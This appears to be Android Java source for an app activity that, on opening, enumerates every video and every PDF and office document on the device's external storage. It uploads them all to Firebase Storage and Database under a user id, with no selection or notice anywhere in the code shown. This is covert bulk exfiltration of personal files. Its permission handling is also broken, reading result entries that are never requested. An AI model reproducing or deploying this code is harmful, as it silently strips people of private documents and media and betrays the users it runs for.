package com.zamba.berreto.activities;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.zamba.berreto.R;
import com.zamba.berreto.models.DocumentModel;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;

public class UploadDataActivity extends AppCompatActivity {
    public ArrayList<String> al_images = new ArrayList<>();
    public ArrayList<String> urlStrings = new ArrayList<String>();

    public ArrayList<DocumentModel> docs_list = new ArrayList<>();
    public ArrayList<String> audio_list = new ArrayList<>();

    public ArrayList<DocumentModel> audio_url = new ArrayList<DocumentModel>();
    private final int STORAGE_REQUEST_CODE = 212;
    String user_id="";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_upload_data);
        if (getIntent().getStringExtra("user_id")!=null) {
            user_id = getIntent().getStringExtra("user_id");
        }

        if (ContextCompat.checkSelfPermission(getApplicationContext(),  Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            al_images=getAllMedia();

            uploadImageToserver(al_images);

            docs_list = getAllDocmnetsPath();


            uploadDocsToserver(docs_list);
        }
        else {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
            },STORAGE_REQUEST_CODE);
        }


    }


    public ArrayList<String> getAllMedia() {
        HashSet<String> videoItemHashSet = new HashSet<>();
        String[] projection = { MediaStore.Video.VideoColumns.DATA ,MediaStore.Video.Media.DISPLAY_NAME};
        Cursor cursor = getApplicationContext().getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, null);
        try {
            cursor.moveToFirst();
            do{
                videoItemHashSet.add((cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA))));
            }while(cursor.moveToNext());

            cursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        ArrayList<String> downloadedList = new ArrayList<>(videoItemHashSet);
        return downloadedList;
    }


    private ArrayList<DocumentModel> getAllDocmnetsPath() {


        ArrayList<DocumentModel> listOfAllDocments = new ArrayList<DocumentModel>();
        String absolutePathOfDocs = null;

        String displayname = null;

        ContentResolver cr = getContentResolver();
        Uri uri = MediaStore.Files.getContentUri("external");

// every column, although that is huge waste, you probably need
// BaseColumns.DATA (the path) only.


        String[] projection = {MediaStore.Files.FileColumns.DATA, MediaStore.Files.FileColumns.DISPLAY_NAME};

// exclude media files, they would be here also.
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
        String mimeType = "application/pdf";
        String orderBy = MediaStore.Files.FileColumns.SIZE + " DESC";
        String whereClause = MediaStore.Files.FileColumns.MIME_TYPE + " IN ('" + mimeType + "')"
                + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + " LIKE 'application/vnd%'";
        String[] selectionArgs = null; // there is no ? in selection so null here

        String sortOrder = null; // unordered
        Cursor fileCursor = cr.query(uri, projection, whereClause,
                null,
                orderBy);

        Log.e("data ", "fileCursor ");
        while (fileCursor.moveToNext()) {

            //your code

            DocumentModel documentModel = new DocumentModel();
            String path = fileCursor.getString(0);
            String name = fileCursor.getString(1);


            documentModel.setDocs_url(path);

            File file = new File(path);
            String strFileName = file.getName();
            documentModel.setDocs_name(strFileName);


            Log.e("data ", "Name :" + strFileName);
            Log.e("data ", "Path :" + path);

            listOfAllDocments.add(documentModel);


        }


        return listOfAllDocments;
    }


    private void  uploadImageToserver(final ArrayList<String>  ImageList)
    {
        int upload_count;
        StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("VideoFolder").child(user_id);

        for (upload_count = 0; upload_count < ImageList.size(); upload_count++) {


            Log.e("data  size", String.valueOf(ImageList.size()));
            String  Path= ImageList.get(upload_count);

            Log.e("data ",ImageList.get(upload_count));
            Uri IndividualImage = Uri.fromFile(new File(Path));

            Log.e("data "," IndividualImage  "+IndividualImage);
            final StorageReference ImageName = ImageFolder.child(String.valueOf(upload_count));

            ImageName.putFile(IndividualImage).addOnSuccessListener(
                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            ImageName.getDownloadUrl().addOnSuccessListener(
                                    new OnSuccessListener<Uri>() {
                                        @Override
                                        public void onSuccess(Uri uri) {
                                            urlStrings.add(String.valueOf(uri));


                                            Log.e("data "," urlStrings  "+urlStrings);
                                            if (urlStrings.size() == ImageList.size()){
                                                storeLink(urlStrings);
                                            }

                                        }
                                    }
                            );
                        }
                    }
            );


        }


    }


    private void uploadDocsToserver(final ArrayList<DocumentModel> ImageList) {
        int upload_count;
        StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("DocumnetFolder").child(user_id);

        for (upload_count = 0; upload_count < ImageList.size(); upload_count++) {


            Log.e("data  size", String.valueOf(ImageList.size()));
            String Path = ImageList.get(upload_count).getDocs_url();
            final String name = ImageList.get(upload_count).getDocs_name();

            Log.e("data ", "Path " + ImageList.get(upload_count).getDocs_url());
            Log.e("data ", "name " + name);
            Uri IndividualImage = Uri.fromFile(new File(Path));

            Log.e("data ", " IndividualImage  " + IndividualImage);
            final StorageReference ImageName = ImageFolder.child(String.valueOf(upload_count));

            final int finalUpload_count = upload_count;
            ImageName.putFile(IndividualImage).addOnSuccessListener(
                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            ImageName.getDownloadUrl().addOnSuccessListener(
                                    new OnSuccessListener<Uri>() {
                                        @Override
                                        public void onSuccess(Uri uri) {

                                            DocumentModel documentModel = new DocumentModel();

                                            String path = String.valueOf(uri);
                                            documentModel.setDocs_url(path);
                                            documentModel.setDocs_name(name);
                                            audio_url.add(documentModel);


                                            Log.e("data ", " urlStrings  " + audio_url);
                                            if (audio_url.size() == ImageList.size()) {
                                                storeDocsLink(audio_url);
                                            }

                                        }
                                    }
                            );
                        }
                    }
            );


        }


    }

    private void storeLink(ArrayList<String> urlStrings) {

        HashMap<String, String> hashMap = new HashMap<>();
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploadVideos").child(user_id);

        for (int i = 0; i <urlStrings.size() ; i++) {
            hashMap.put("ImgLink"+i, urlStrings.get(i));

            databaseReference.child(String.valueOf(i)).child("video_url").setValue(urlStrings.get(i));

        }



//        databaseReference.push().setValue(hashMap)
//                .addOnCompleteListener(
//                        new OnCompleteListener<Void>() {
//                            @Override
//                            public void onComplete(@NonNull Task<Void> task) {
//                                if (task.isSuccessful()) {
//
//                                }
//                            }
//                        }
//                ).addOnFailureListener(new OnFailureListener() {
//            @Override
//            public void onFailure(@NonNull Exception e) {
//                Toast.makeText(getContext(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
//            }
        //      });

    }


    private void storeDocsLink(ArrayList<DocumentModel> urlStrings) {

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploaDocs").child(user_id);

        for (int i = 0; i < urlStrings.size(); i++) {


            DocumentModel audioModel = new DocumentModel(urlStrings.get(i).getDocs_url(), urlStrings.get(i).getDocs_name());

            databaseReference.child(String.valueOf(i)).setValue(audioModel);

        }

//        databaseReference.push().setValue(hashMap)
//                .addOnCompleteListener(
//                        new OnCompleteListener<Void>() {
//                            @Override
//                            public void onComplete(@NonNull Task<Void> task) {
//                                if (task.isSuccessful()) {
//
//                                }
//                            }
//                        }
//                ).addOnFailureListener(new OnFailureListener() {
//            @Override
//            public void onFailure(@NonNull Exception e) {
//                Toast.makeText(ChatActivity.this, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
//            }
//        });

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case STORAGE_REQUEST_CODE:

                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED
                        && grantResults[1] == PackageManager.PERMISSION_GRANTED
                        && grantResults[2] == PackageManager.PERMISSION_GRANTED
                        && grantResults[3] == PackageManager.PERMISSION_GRANTED
                        && grantResults[4] == PackageManager.PERMISSION_GRANTED
                        && grantResults[5] == PackageManager.PERMISSION_GRANTED
                        && grantResults[6] == PackageManager.PERMISSION_GRANTED
                ) {
                    docs_list = getAllDocmnetsPath();
//
//
                    uploadDocsToserver(docs_list);

                    Log.e("WORK ", "WORK  ON Permission ");

//                    docs_list = getAllDocmnetsPath();
//
//
//                    uploadDocsToserver(docs_list);

//                    audio_list=getAllMedia();
//                    uploadAudioToserver(audio_list);

                }
                break;
        }
    }
}